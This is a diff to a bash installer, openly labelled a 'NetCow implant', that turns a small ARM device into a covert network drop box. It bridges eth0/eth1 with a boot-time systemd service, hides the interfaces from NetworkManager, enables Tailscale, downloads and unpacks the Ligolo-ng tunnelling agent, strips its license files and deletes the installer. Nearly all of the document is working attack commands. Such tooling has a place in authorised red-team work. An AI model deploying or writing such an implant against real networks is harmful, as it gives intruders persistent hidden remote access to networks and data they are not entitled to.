@@ -1,7 +1,5 @@
 #!/bin/bash
-
 set -e
-
 echo "[+] Deploying NetCow implant..."
 
 # 1. Install required packages
@@ -66,7 +64,7 @@ EOF
 chmod +x /usr/local/sbin/setup_bridge.sh
 echo "[+] setup_bridge.sh created."
 
-# 4. Create systemd service
+# 4. Create systemd service for setup_bridge
 cat << 'EOF' > /etc/systemd/system/setup-bridge.service
 [Unit]
 Description=Setup bridge br0 at boot
@@ -84,7 +82,7 @@ EOF
 
 echo "[+] Systemd service setup-bridge.service created."
 
-# 5. NetworkManager config to ignore eth0/eth1
+# 5. Configure NetworkManager to ignore eth0/eth1
 NM_CONF="/etc/NetworkManager/NetworkManager.conf"
 echo "[+] Configuring NetworkManager to ignore eth0/eth1..."
 if ! grep -q "\[keyfile\]" "$NM_CONF"; then
@@ -99,7 +97,7 @@ fi
 systemctl restart NetworkManager
 echo "[+] NetworkManager restarted."
 
-# 6. Enable bridge service
+# 6. Enable bridge service at boot
 systemctl daemon-reexec
 systemctl enable setup-bridge.service
 echo "[+] setup-bridge.service enabled."
@@ -108,20 +106,21 @@ echo "[+] setup-bridge.service enabled."
 echo "[+] Enabling and starting Tailscale..."
 systemctl enable tailscaled
 systemctl start tailscaled
-echo "[+] Tailscale daemon running."
+echo "[+] Tailscale daemon is running."
 
 # 8. Download and extract Ligolo-ng agent
 echo "[+] Downloading Ligolo-ng agent..."
 mkdir -p /opt/ligolo
 curl -sSL https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_arm64.tar.gz -o /opt/ligolo/ligolo-agent.tar.gz
 tar -xvzf /opt/ligolo/ligolo-agent.tar.gz -C /opt/ligolo/
+rm -f /opt/ligolo/LICENSE /opt/ligolo/README.md /opt/ligolo/ligolo-agent.tar.gz
 chmod +x /opt/ligolo/agent
-rm /opt/ligolo/ligolo-agent.tar.gz
 echo "[+] Ligolo-ng agent ready at /opt/ligolo/agent"
 
-# 9. Self-delete script
+# 9. Self-delete installer
 INSTALLER_PATH=$(readlink -f "$0")
 echo "[+] Deleting installer script: $INSTALLER_PATH"
 rm -f "$INSTALLER_PATH"
 
-echo "[✓] Installation complete. Reboot to activate the implant and run Tailscale or Ligolo."
+echo "[✓] Installation complete."
+echo "[✓] ToDo 'sudo reboot'"
